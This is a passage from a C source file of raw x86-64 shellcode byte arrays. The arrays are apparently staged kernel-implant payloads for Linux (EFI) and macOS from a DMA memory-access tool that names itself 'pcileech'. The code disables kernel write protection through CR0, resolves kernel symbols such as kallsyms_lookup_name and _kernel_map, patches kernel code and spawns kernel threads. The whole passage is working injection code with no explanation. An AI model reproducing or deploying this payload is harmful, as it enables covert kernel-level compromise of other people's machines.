  0x9e, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x53, 0x40, 0x4c, 0x8b, 0xcb, 0x48, 0x8b, 0x8b, 0x38, 0x03,
  0x00, 0x00, 0x49, 0xc1, 0xe8, 0x0c, 0x48, 0xc1, 0xea, 0x0c, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8,
  0xb0, 0xfb, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x49, 0x3b, 0xc7, 0x74, 0x6c, 0x48, 0x8b, 0x53, 0x40,
  0x48, 0x85, 0xc0, 0x75, 0x0b, 0x48, 0x8b, 0x4b, 0x10, 0xe8, 0xea, 0xfb, 0xff, 0xff, 0xeb, 0x10,
  0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0x8b, 0x48, 0x03, 0x00, 0x00, 0xe8, 0x84, 0xfb, 0xff, 0xff,
  0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x40, 0x4c, 0x39, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x4c,
  0x8b, 0xc0, 0x48, 0x8b, 0x53, 0x28, 0x4c, 0x8b, 0x4b, 0x48, 0x4c, 0x0f, 0x45, 0xc2, 0x48, 0x8b,
  0x8b, 0x20, 0x03, 0x00, 0x00, 0x48, 0x0f, 0x45, 0xd0, 0xe8, 0x56, 0xfb, 0xff, 0xff, 0x48, 0x85,
  0xf6, 0x74, 0x0f, 0x48, 0x8b, 0x8b, 0x40, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xd7, 0xe8, 0x42, 0xfb,
  0xff, 0xff, 0x4c, 0x89, 0x7b, 0x38, 0xeb, 0x05, 0x48, 0x83, 0x63, 0x38, 0x00, 0x48, 0x8b, 0x83,
  0xf8, 0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x06, 0x75, 0x23, 0x4c, 0x8b, 0x4b, 0x48, 0x4c, 0x8b,
  0x43, 0x40, 0x48, 0x8b, 0x53, 0x28, 0x48, 0x8b, 0x8b, 0x20, 0x03, 0x00, 0x00, 0xe8, 0x12, 0xfb,
  0xff, 0xff, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x7b, 0x38, 0x48, 0x83, 0xf8,
  0x07, 0x75, 0x1c, 0x4c, 0x8b, 0x4b, 0x48, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0x53, 0x40, 0x48,
  0x8b, 0x8b, 0x20, 0x03, 0x00, 0x00, 0xe8, 0xe9, 0xfa, 0xff, 0xff, 0x4c, 0x89, 0x7b, 0x38, 0x48,
  0x83, 0xa3, 0xf8, 0x0f, 0x00, 0x00, 0x00, 0xe9, 0x10, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x18,
  0x03, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0xf0, 0x41, 0xb8, 0x0a, 0x00, 0x00, 0x00, 0x48, 0x89,
  0x43, 0x30, 0x48, 0x8b, 0xd5, 0xe8, 0xba, 0xfa, 0xff, 0xff, 0x48, 0x83, 0x63, 0x20, 0x00, 0x48,
  0x83, 0x63, 0x28, 0x00, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00, 0x00, 0x00,
  0x4c, 0x89, 0x7b, 0x38, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b,
  0x74, 0x24, 0x70, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x50, 0x41, 0x5f, 0xc3
};

const BYTE LINUX_X64_STAGE2_EFI_BIN[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00,
    0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00,
    0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x49, 0xc7, 0xc3, 0x0e,
    0x00, 0x00, 0x00, 0x49, 0xff, 0xcb, 0x58, 0x48, 0x85, 0xc0, 0x74, 0xf7,
    0x50, 0x4c, 0x8b, 0xd0, 0x48, 0x8d, 0x05, 0xf9, 0xfe, 0xff, 0xff, 0x42,
    0xff, 0x74, 0xd8, 0x08, 0x57, 0x56, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51,
    0x53, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0xc7,
    0xc1, 0x0e, 0x00, 0x00, 0x00, 0x48, 0xff, 0xc9, 0x48, 0x8d, 0x05, 0xd1,
    0xfe, 0xff, 0xff, 0x48, 0x8b, 0x14, 0xc8, 0x48, 0x8b, 0x05, 0xbe, 0xfe,
    0xff, 0xff, 0x48, 0x89, 0x54, 0xc8, 0x18, 0x48, 0x85, 0xc9, 0x75, 0xe1,
    0x49, 0x8b, 0xca, 0xe8, 0x26, 0x00, 0x00, 0x00, 0xe8, 0x76, 0x00, 0x00,
    0x00, 0xe8, 0xf4, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d,
    0x41, 0x5c, 0x5d, 0x5b, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0x5e, 0x5f,
    0x58, 0x48, 0x89, 0x05, 0x08, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x48, 0x8d,
    0x05, 0x1f, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0x28, 0x4c, 0x8b, 0x70, 0x08,
    0x4c, 0x8b, 0x78, 0x0e, 0x48, 0xff, 0xc1, 0x48, 0x8b, 0x01, 0x49, 0x3b,
    0xc5, 0x75, 0xf5, 0x48, 0x8b, 0x41, 0x08, 0x49, 0x3b, 0xc6, 0x75, 0xec,
    0x48, 0x8b, 0x41, 0x0e, 0x49, 0x3b, 0xc7, 0x75, 0xe3, 0x48, 0xff, 0xc1,
    0x4c, 0x8b, 0xf9, 0x48, 0xc1, 0xe9, 0x03, 0x48, 0xc1, 0xe1, 0x03, 0x48,
    0x83, 0xe9, 0x08, 0x48, 0x8b, 0x01, 0x49, 0x3b, 0xc7, 0x75, 0xf4, 0x48,
    0x8b, 0x41, 0xf8, 0x48, 0x89, 0x05, 0x02, 0xff, 0xff, 0xff, 0xc3, 0x41,
    0x57, 0x4c, 0x8b, 0x3d, 0xf8, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0x20,
    0x02, 0x00, 0x00, 0x41, 0xff, 0xd7, 0x48, 0x89, 0x05, 0xdf, 0xfe, 0xff,
    0xff, 0x48, 0x8d, 0x3d, 0x18, 0x02, 0x00, 0x00, 0x41, 0xff, 0xd7, 0x48,
    0x89, 0x05, 0xc6, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0xcc, 0x01, 0x00,
    0x00, 0x41, 0xff, 0xd7, 0x48, 0x89, 0x05, 0xad, 0xfe, 0xff, 0xff, 0x48,
    0x8d, 0x3d, 0xcf, 0x01, 0x00, 0x00, 0x41, 0xff, 0xd7, 0x48, 0x89, 0x05,
    0x94, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0xcf, 0x01, 0x00, 0x00, 0x41,
    0xff, 0xd7, 0x48, 0x89, 0x05, 0x6b, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d,
    0x82, 0x01, 0x00, 0x00, 0x41, 0xff, 0xd7, 0x48, 0x89, 0x05, 0x62, 0xfe,
    0xff, 0xff, 0x48, 0x8d, 0x3d, 0xd0, 0x01, 0x00, 0x00, 0x41, 0xff, 0xd7,
    0x48, 0x89, 0x05, 0x59, 0xfe, 0xff, 0xff, 0x41, 0x5f, 0xc3, 0x48, 0xc7,
    0xc7, 0x14, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,
    0xff, 0x15, 0x52, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xf8, 0xe8, 0x1c, 0x01,
    0x00, 0x00, 0x4c, 0x8b, 0xe8, 0x49, 0x8b, 0xfd, 0xe8, 0xeb, 0x00, 0x00,
    0x00, 0x4c, 0x8b, 0xe0, 0x4c, 0x89, 0x2d, 0xfd, 0xfd, 0xff, 0xff, 0x4c,
    0x89, 0x25, 0xfe, 0xfd, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xc4, 0x01, 0x00,
    0x00, 0x48, 0x8d, 0x15, 0xd0, 0x01, 0x00, 0x00, 0x48, 0x81, 0xe2, 0xff,
    0x0f, 0x00, 0x00, 0x49, 0x03, 0xd4, 0x48, 0x89, 0x10, 0x48, 0x8b, 0x15,
    0x1c, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc2, 0x19, 0x48, 0x8b, 0x0d, 0x09,
    0xfe, 0xff, 0xff, 0x2b, 0xca, 0x48, 0x8d, 0x05, 0xa4, 0x01, 0x00, 0x00,
    0x89, 0x08, 0x48, 0x33, 0xc9, 0x4c, 0x8b, 0x05, 0xfc, 0xfd, 0xff, 0xff,
    0x4c, 0x8d, 0x0d, 0x5c, 0x01, 0x00, 0x00, 0x4a, 0x8b, 0x04, 0x01, 0x4a,
    0x89, 0x04, 0x09, 0x48, 0x83, 0xc1, 0x08, 0x48, 0x83, 0xf9, 0x20, 0x75,
    0xee, 0x48, 0x33, 0xc9, 0x4c, 0x8d, 0x05, 0xe9, 0xfd, 0xff, 0xff, 0x49,
    0xc1, 0xe8, 0x0c, 0x49, 0xc1, 0xe0, 0x0c, 0x4a, 0x8b, 0x04, 0x01, 0x4a,
    0x89, 0x04, 0x21, 0x48, 0x83, 0xc1, 0x08, 0x48, 0x81, 0xf9, 0x00, 0x10,
    0x00, 0x00, 0x75, 0xeb, 0x0f, 0x20, 0xc0, 0x4c, 0x8b, 0xf8, 0x25, 0xff,
    0xff, 0xfe, 0xff, 0x0f, 0x22, 0xc0, 0x48, 0x33, 0xc9, 0x4c, 0x8b, 0x05,
    0xa4, 0xfd, 0xff, 0xff, 0x4c, 0x8d, 0x0d, 0x24, 0x01, 0x00, 0x00, 0x4a,
    0x8b, 0x04, 0x09, 0x4a, 0x89, 0x04, 0x01, 0x48, 0x83, 0xc1, 0x08, 0x48,
    0x83, 0xf9, 0x20, 0x75, 0xee, 0x41, 0x0f, 0x22, 0xc7, 0x44, 0x89, 0x2d,
    0xb0, 0xfc, 0xff, 0xff, 0xc3, 0x48, 0x8b, 0x05, 0x60, 0xfd, 0xff, 0xff,
    0x48, 0x85, 0xc0, 0x74, 0x04, 0x48, 0x8b, 0x00, 0xc3, 0x48, 0xb8, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x88, 0xff, 0xff, 0xc3, 0x57, 0xe8, 0xdf, 0xff,
    0xff, 0xff, 0x5f, 0x48, 0x03, 0xc7, 0xc3, 0x48, 0x8b, 0x05, 0x22, 0xfd,
    0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x04, 0x48, 0x8b, 0x00, 0xc3, 0x48,
    0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0xff, 0xff, 0xc3, 0x57, 0xe8,
    0xdf, 0xff, 0xff, 0xff, 0x5f, 0x48, 0x2b, 0xf8, 0x48, 0xc1, 0xef, 0x07,
    0x48, 0xc1, 0xe7, 0x0c, 0x48, 0x8b, 0xc7, 0xc3, 0x00, 0x6b, 0x61, 0x6c,
    0x6c, 0x73, 0x79, 0x6d, 0x73, 0x5f, 0x6c, 0x6f, 0x6f, 0x6b, 0x75, 0x70,
    0x5f, 0x6e, 0x61, 0x6d, 0x65, 0x00, 0x6b, 0x74, 0x68, 0x72, 0x65, 0x61,
    0x64, 0x5f, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x5f, 0x6f, 0x6e, 0x5f,
    0x6e, 0x6f, 0x64, 0x65, 0x00, 0x61, 0x6c, 0x6c, 0x6f, 0x63, 0x5f, 0x70,
    0x61, 0x67, 0x65, 0x73, 0x5f, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74,
    0x00, 0x70, 0x61, 0x67, 0x65, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74,
    0x5f, 0x62, 0x61, 0x73, 0x65, 0x00, 0x76, 0x6d, 0x65, 0x6d, 0x6d, 0x61,
    0x70, 0x5f, 0x62, 0x61, 0x73, 0x65, 0x00, 0x76, 0x66, 0x73, 0x5f, 0x72,
    0x65, 0x61, 0x64, 0x00, 0x73, 0x65, 0x74, 0x5f, 0x6d, 0x65, 0x6d, 0x6f,
    0x72, 0x79, 0x5f, 0x78, 0x00, 0x77, 0x61, 0x6b, 0x65, 0x5f, 0x75, 0x70,
    0x5f, 0x70, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x70, 0x63, 0x69,
    0x6c, 0x65, 0x65, 0x63, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x57, 0x56, 0x52, 0x51, 0x48, 0xbf, 0x88, 0x88, 0x88,
    0x88, 0x88, 0x88, 0x88, 0x88, 0x57, 0xbe, 0x01, 0x00, 0x00, 0x00, 0xe9,
    0x77, 0x77, 0x77, 0x77, 0x41, 0x50, 0x41, 0x51, 0x53, 0x55, 0x41, 0x54,
    0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x0f, 0x20, 0xc2, 0x48, 0x8b, 0xc2,
    0x25, 0xff, 0xff, 0xfe, 0xff, 0x0f, 0x22, 0xc0, 0x48, 0x33, 0xc9, 0x4c,
    0x8b, 0x05, 0x3a, 0xfc, 0xff, 0xff, 0x4c, 0x8d, 0x0d, 0x9a, 0xff, 0xff,
    0xff, 0x4a, 0x8b, 0x04, 0x09, 0x4a, 0x89, 0x04, 0x01, 0x48, 0x83, 0xc1,
    0x08, 0x48, 0x83, 0xf9, 0x20, 0x75, 0xee, 0x0f, 0x22, 0xc2, 0xb0, 0x00,
    0xb2, 0x01, 0x48, 0x8d, 0x0d, 0x79, 0xff, 0xff, 0xff, 0xf0, 0x0f, 0xb0,
    0x11, 0x75, 0x05, 0xe8, 0x5a, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e,
    0x41, 0x5d, 0x41, 0x5c, 0x5d, 0x5b, 0x41, 0x59, 0x41, 0x58, 0x59, 0x5a,
    0x5e, 0x5f, 0xff, 0x25, 0xf0, 0xfb, 0xff, 0xff, 0xeb, 0x07, 0x6d, 0x73,
    0x6c, 0x65, 0x65, 0x70, 0x00, 0x48, 0x8d, 0x3d, 0xf2, 0xff, 0xff, 0xff,
    0x48, 0x8d, 0x05, 0xf9, 0xef, 0xff, 0xff, 0x48, 0x8b, 0x00, 0xff, 0xd0,
    0x48, 0xc7, 0xc7, 0x64, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0x05,
    0xcc, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xf8, 0x00, 0x74,
    0xd4, 0x48, 0x33, 0xc0, 0xb9, 0x00, 0x04, 0x00, 0x00, 0xfc, 0xf3, 0x48,
    0xab, 0xc3, 0x48, 0xc7, 0xc7, 0x14, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6,
    0x02, 0x00, 0x00, 0x00, 0xff, 0x15, 0x8a, 0xfb, 0xff, 0xff, 0x48, 0x8b,
    0xf8, 0xe8, 0x54, 0xfe, 0xff, 0xff, 0x4c, 0x8b, 0xe8, 0x49, 0x8b, 0xfd,
    0xe8, 0x23, 0xfe, 0xff, 0xff, 0x4c, 0x8b, 0xe0, 0x49, 0x8b, 0xfc, 0x48,
    0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00, 0xff, 0x15, 0x6c, 0xfb, 0xff, 0xff,
    0x49, 0x8b, 0xfc, 0xe8, 0xb1, 0xff, 0xff, 0xff, 0x48, 0xc7, 0xc7, 0x40,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xef, 0x08, 0x48, 0x8d, 0x05, 0x6a, 0xff,
    0xff, 0xff, 0x48, 0x8b, 0x04, 0x07, 0x49, 0x8b, 0xf4, 0x48, 0x81, 0xc6,
    0x00, 0x10, 0x00, 0x00, 0x48, 0x03, 0xf7, 0x48, 0x89, 0x06, 0x48, 0x85,
    0xff, 0x75, 0xdc, 0x49, 0x8b, 0xfc, 0x48, 0x81, 0xc7, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x33, 0xf6, 0x48, 0x33, 0xd2, 0x48, 0x83, 0xea, 0x01, 0x48,
    0x8d, 0x0d, 0x83, 0xfe, 0xff, 0xff, 0xff, 0x15, 0xf8, 0xfa, 0xff, 0xff,
    0x49, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0x05, 0x1c, 0xfb, 0xff, 0xff,
    0x49, 0x89, 0x44, 0x24, 0x10, 0x49, 0x8b, 0x7c, 0x24, 0x58, 0xff, 0x15,
    0xe4, 0xfa, 0xff, 0xff, 0x44, 0x89, 0x2d, 0x2d, 0xfa, 0xff, 0xff, 0xc3
};

const BYTE MACOS_STAGE1_BIN[] = {
    0xe8, 0xfb, 0xff, 0xff, 0xff
};

const BYTE MACOS_STAGE2_BIN[] = {
    0xeb, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83, 0xe8,
    0x05, 0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x0f, 0x20,
    0xc1, 0x51, 0x81, 0xe1, 0xff, 0xff, 0xfe, 0xff, 0x0f, 0x22, 0xc1, 0x48,
    0x8b, 0x15, 0xd2, 0xff, 0xff, 0xff, 0x48, 0x89, 0x10, 0xb0, 0x00, 0xb2,
    0x01, 0x48, 0x8d, 0x0d, 0xbe, 0xff, 0xff, 0xff, 0xf0, 0x0f, 0xb0, 0x11,
    0x75, 0x2f, 0x8b, 0x05, 0xc0, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0xa9,
    0xff, 0xff, 0xff, 0x48, 0x03, 0xf8, 0x48, 0x8d, 0x35, 0x5a, 0x02, 0x00,
    0x00, 0xe8, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x3d, 0x39, 0x00, 0x00,
    0x00, 0xc8, 0x20, 0x00, 0x00, 0xff, 0xd0, 0xe8, 0x0e, 0x00, 0x00, 0x00,
    0xc9, 0x58, 0x0f, 0x22, 0xc0, 0x41, 0x59, 0x41, 0x58, 0x59, 0x5a, 0x5e,
    0x5f, 0xc3, 0x50, 0x0f, 0x20, 0xc0, 0x25, 0xff, 0xff, 0xfe, 0xff, 0x0f,
    0x22, 0xc0, 0x58, 0xc3, 0x48, 0x33, 0xc0, 0x48, 0xc7, 0xc1, 0x00, 0x04,
    0x00, 0x00, 0x48, 0x89, 0x44, 0xcf, 0xf8, 0xe2, 0xf9, 0xc3, 0xe8, 0xdb,
    0xff, 0xff, 0xff, 0x4c, 0x8d, 0x35, 0x4e, 0xff, 0xff, 0xff, 0x49, 0x81,
    0xe6, 0x00, 0xf0, 0xff, 0xff, 0x49, 0x81, 0xc6, 0x00, 0x10, 0x00, 0x00,
    0x8b, 0x05, 0x4a, 0xff, 0xff, 0xff, 0x4c, 0x8d, 0x3d, 0x33, 0xff, 0xff,
    0xff, 0x4c, 0x03, 0xf8, 0x0f, 0x20, 0xd8, 0x49, 0x89, 0x46, 0xf8, 0x49,
    0x8b, 0xff, 0x48, 0x8d, 0x35, 0xc6, 0x01, 0x00, 0x00, 0xe8, 0x64, 0x01,
    0x00, 0x00, 0x48, 0xc7, 0xc7, 0x00, 0x20, 0x00, 0x00, 0x48, 0xc7, 0xc6,
    0x0c, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x48, 0x8b, 0xd4, 0xc8, 0x20, 0x00,
    0x00, 0xff, 0xd0, 0xc9, 0x5b, 0xe8, 0x80, 0xff, 0xff, 0xff, 0x48, 0x83,
    0xf8, 0x00, 0x0f, 0x84, 0xaf, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xe0, 0x49,
    0x89, 0x46, 0xe8, 0x49, 0x89, 0x5e, 0xe0, 0x48, 0x8b, 0xc3, 0x48, 0xc1,
    0xe8, 0x20, 0x48, 0x83, 0xf8, 0x00, 0x0f, 0x85, 0x93, 0x00, 0x00, 0x00,
    0x49, 0x8b, 0xfc, 0xe8, 0x60, 0xff, 0xff, 0xff, 0x48, 0xb8, 0x48, 0x8d,
    0x05, 0xf1, 0xff, 0xff, 0xff, 0x48, 0x49, 0x89, 0x84, 0x24, 0x00, 0x10,
    0x00, 0x00, 0x48, 0xb8, 0x8b, 0x00, 0x48, 0x83, 0xf8, 0x00, 0x74, 0xf0,
    0x49, 0x89, 0x84, 0x24, 0x08, 0x10, 0x00, 0x00, 0x49, 0x8b, 0xff, 0x48,
    0x8d, 0x35, 0x69, 0x01, 0x00, 0x00, 0xe8, 0xe3, 0x00, 0x00, 0x00, 0x48,
    0x83, 0xf8, 0x00, 0x74, 0x52, 0x4c, 0x8b, 0x28, 0x49, 0x8b, 0xff, 0x48,
    0x8d, 0x35, 0x21, 0x01, 0x00, 0x00, 0xe8, 0xcb, 0x00, 0x00, 0x00, 0x49,
    0x8b, 0xfd, 0x49, 0x8b, 0xf4, 0x48, 0x81, 0xc6, 0x00, 0x10, 0x00, 0x00,
    0x48, 0xc7, 0xc2, 0x00, 0x10, 0x00, 0x00, 0x48, 0xc7, 0xc1, 0x00, 0x00,
    0x00, 0x00, 0x49, 0xc7, 0xc0, 0x05, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48,
    0x83, 0xf8, 0x00, 0x75, 0x16, 0x4d, 0x89, 0x7c, 0x24, 0x08, 0x89, 0x1d,
    0x50, 0xfe, 0xff, 0xff, 0x49, 0x8b, 0xc4, 0x48, 0x05, 0x00, 0x10, 0x00,
    0x00, 0xff, 0xe0, 0xb8, 0xff, 0xff, 0xff, 0xff, 0x89, 0x05, 0x3a, 0xfe,
    0xff, 0xff, 0xc3, 0x51, 0x48, 0x33, 0xc9, 0x48, 0xff, 0xc9, 0x48, 0xff,
    0xc1, 0x8a, 0x04, 0x39, 0x3a, 0x04, 0x31, 0x75, 0x09, 0x3c, 0x00, 0x75,
    0xf1, 0x48, 0x33, 0xc0, 0x59, 0xc3, 0xb0, 0x01, 0x59, 0xc3, 0xb8, 0xcf,
    0xfa, 0xed, 0xfe, 0x3b, 0x07, 0x75, 0x37, 0xb8, 0x07, 0x00, 0x00, 0x01,
    0x3b, 0x47, 0x04, 0x75, 0x2d, 0x48, 0x33, 0xc9, 0x48, 0xb8, 0x5f, 0x5f,
    0x4c, 0x49, 0x4e, 0x4b, 0x45, 0x44, 0x48, 0x3b, 0x04, 0x39, 0x74, 0x0f,
    0x48, 0x83, 0xc1, 0x04, 0x48, 0x81, 0xf9, 0x00, 0x20, 0x00, 0x00, 0x74,
    0x0d, 0xeb, 0xeb, 0x48, 0x8b, 0x44, 0x39, 0x10, 0x48, 0x03, 0x44, 0x39,
    0x18, 0xc3, 0x48, 0x33, 0xc0, 0xc3, 0x48, 0x8b, 0xcf, 0x48, 0x83, 0xc1,
    0x20, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x39, 0x01, 0x74, 0x08, 0x8b, 0x41,
    0x04, 0x48, 0x03, 0xc8, 0xeb, 0xef, 0x48, 0x8b, 0xc1, 0xc3, 0x41, 0x52,
    0xe8, 0xdd, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0xc0, 0xe8, 0x91, 0xff, 0xff,
    0xff, 0x4c, 0x8b, 0xc8, 0x41, 0x8b, 0x40, 0x14, 0x4c, 0x2b, 0xc8, 0x4d,
    0x8b, 0xd1, 0x41, 0x8b, 0x48, 0x0c, 0x49, 0x83, 0xe9, 0x10, 0x49, 0x8b,
    0x41, 0x08, 0x48, 0xc1, 0xe8, 0x20, 0x83, 0xf8, 0x80, 0x75, 0x11, 0x41,
    0x8b, 0x39, 0x49, 0x03, 0xfa, 0xe8, 0x45, 0xff, 0xff, 0xff, 0x48, 0x83,
    0xf8, 0x00, 0x74, 0x08, 0xe2, 0xdc, 0x48, 0x33, 0xc0, 0x41, 0x5a, 0xc3,
    0x49, 0x8b, 0x41, 0x08, 0x41, 0x5a, 0xc3, 0x5f, 0x76, 0x6d, 0x5f, 0x70,
    0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x00, 0x5f, 0x49, 0x4f, 0x4d, 0x61,
    0x6c, 0x6c, 0x6f, 0x63, 0x43, 0x6f, 0x6e, 0x74, 0x69, 0x67, 0x75, 0x6f,
    0x75, 0x73, 0x00, 0x5f, 0x49, 0x4f, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
    0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x5f, 0x6b, 0x65, 0x72, 0x6e,
    0x65, 0x6c, 0x5f, 0x6d, 0x61, 0x70, 0x00
};

const BYTE MACOS_STAGE3_BIN[] = {
    0x48, 0x8d, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x83,
    0xf8, 0x00, 0x74, 0xf0, 0x48, 0x8d, 0x0d, 0xe9, 0xef, 0xff, 0xff, 0xc8,
    0x20, 0x00, 0x00, 0xe8, 0x30, 0x03, 0x00, 0x00, 0xc9, 0xc3, 0x51, 0x48,
    0x33, 0xc9, 0x48, 0xff, 0xc9, 0x48, 0xff, 0xc1, 0x8a, 0x04, 0x39, 0x3a,
    0x04, 0x31, 0x75, 0x09, 0x3c, 0x00, 0x75, 0xf1, 0x48, 0x33, 0xc0, 0x59,
    0xc3, 0xb0, 0x01, 0x59, 0xc3, 0xb8, 0xcf, 0xfa, 0xed, 0xfe, 0x3b, 0x07,
    0x75, 0x37, 0xb8, 0x07, 0x00, 0x00, 0x01, 0x3b, 0x47, 0x04, 0x75, 0x2d,
    0x48, 0x33, 0xc9, 0x48, 0xb8, 0x5f, 0x5f, 0x4c, 0x49, 0x4e, 0x4b, 0x45,
    0x44, 0x48, 0x3b, 0x04, 0x39, 0x74, 0x0f, 0x48, 0x83, 0xc1, 0x04, 0x48,
    0x81, 0xf9, 0x00, 0x20, 0x00, 0x00, 0x74, 0x0d, 0xeb, 0xeb, 0x48, 0x8b,
    0x44, 0x39, 0x10, 0x48, 0x03, 0x44, 0x39, 0x18, 0xc3, 0x48, 0x33, 0xc0,
    0xc3, 0x48, 0x8b, 0xcf, 0x48, 0x83, 0xc1, 0x20, 0xb8, 0x02, 0x00, 0x00,
    0x00, 0x39, 0x01, 0x74, 0x08, 0x8b, 0x41, 0x04, 0x48, 0x03, 0xc8, 0xeb,
